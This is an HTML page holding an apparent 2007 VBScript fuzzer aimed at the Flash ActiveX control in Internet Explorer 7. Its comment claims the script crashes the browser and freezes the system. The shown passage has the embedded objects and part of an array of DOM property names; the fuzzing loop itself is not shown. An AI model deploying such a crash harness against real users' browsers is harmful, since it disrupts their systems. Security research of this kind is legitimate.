<html>
<body>

<h1>Flash Object VBFuzzer</h1>

<hr />

<object classid='clsid:D27CDB6E-AE6D-11CF-96B8-444553540000' id='foo'>
<param name="src" value="foo.swf">
<param name="playing" value="0">

</object>

<object classid='clsid:D27CDB6E-AE6D-11CF-96B8-444553540000' id='bar'>
<param name="src" value="foo.swf">
<param name="playing" value="0">
</object>

<hr />
<script type="text/vbscript">
' ------------------------------
' Alexandra van den Heetkamp (2007)
' SWRemote crashes MSIE7
' full system freeze on kill.
' ------------------------------
'

Dim DataArray(195)
DataArray(0) = "nextSibling"
DataArray(1) = "onresizeend"
DataArray(2) = "onrowenter"
DataArray(3) = "ariaPosinset"
DataArray(4) = "childNodes"
DataArray(5) = "ondragleave"
DataArray(6) = "canHaveHTML"
DataArray(7) = "onbeforepaste"
DataArray(8) = "ondragover"
DataArray(9) = "ariaSelected"
DataArray(10) = "onbeforecopy"
DataArray(11) = "ariaHidden"
DataArray(12) = "onpage"
DataArray(13) = "recordNumber"
DataArray(14) = "previousSibling"
DataArray(15) = "nodeName"
DataArray(16) = "onbeforeactivate"
DataArray(17) = "accessKey"
DataArray(18) = "currentStyle"
DataArray(19) = "ariaChecked"
DataArray(20) = "scrollLeft"
DataArray(21) = "onbeforeeditfocus"
DataArray(22) = "oncontrolselect"
DataArray(23) = "onblur"
DataArray(24) = "hideFocus"
DataArray(25) = "clientHeight"
DataArray(26) = "style"
DataArray(27) = "onbeforedeactivate"
DataArray(28) = "dir"
DataArray(29) = "onkeydown"
DataArray(30) = "nodeType"
DataArray(31) = "ondragstart"
DataArray(32) = "onscroll"
DataArray(33) = "onpropertychange"
DataArray(34) = "ondragenter"
DataArray(35) = "id"
DataArray(36) = "onrowsinserted"
DataArray(37) = "scopeName"
DataArray(38) = "lang"
DataArray(39) = "ariaSetsize"
DataArray(40) = "onmouseup"
DataArray(41) = "oncontextmenu"
DataArray(42) = "language"
DataArray(43) = "ariaLevel"
DataArray(44) = "ariaReadonly"
DataArray(45) = "scrollTop"
DataArray(46) = "offsetWidth"
DataArray(47) = "onbeforeupdate"
DataArray(48) = "onreadystatechange"
DataArray(49) = "onmouseenter"
DataArray(50) = "filters"
DataArray(51) = "onresize"
DataArray(52) = "isContentEditable"
DataArray(53) = "oncopy"
DataArray(54) = "onselectstart"
DataArray(55) = "scrollHeight"
DataArray(56) = "onmove"
DataArray(57) = "ondragend"
DataArray(58) = "onrowexit"
DataArray(59) = "lastChild"
DataArray(60) = "onactivate"
DataArray(61) = "canHaveChildren"
DataArray(62) = "onfocus"
DataArray(63) = "onfocusin"
DataArray(64) = "isMultiLine"
DataArray(65) = "onmouseover"
DataArray(66) = "ariaHaspopup"
DataArray(67) = "ariaMultiselect"
DataArray(68) = "oncut"
DataArray(69) = "parentNode"
DataArray(70) = "ariaSecret"
DataArray(71) = "tagName"
DataArray(72) = "className"
DataArray(73) = "onmousemove"
DataArray(74) = "title"
DataArray(75) = "role"
DataArray(76) = "behaviorUrns"
DataArray(77) = "ariaInvalid"
DataArray(78) = "onfocusout"
DataArray(79) = "onfilterchange"
DataArray(80) = "disabled"
DataArray(81) = "parentTextEdit"
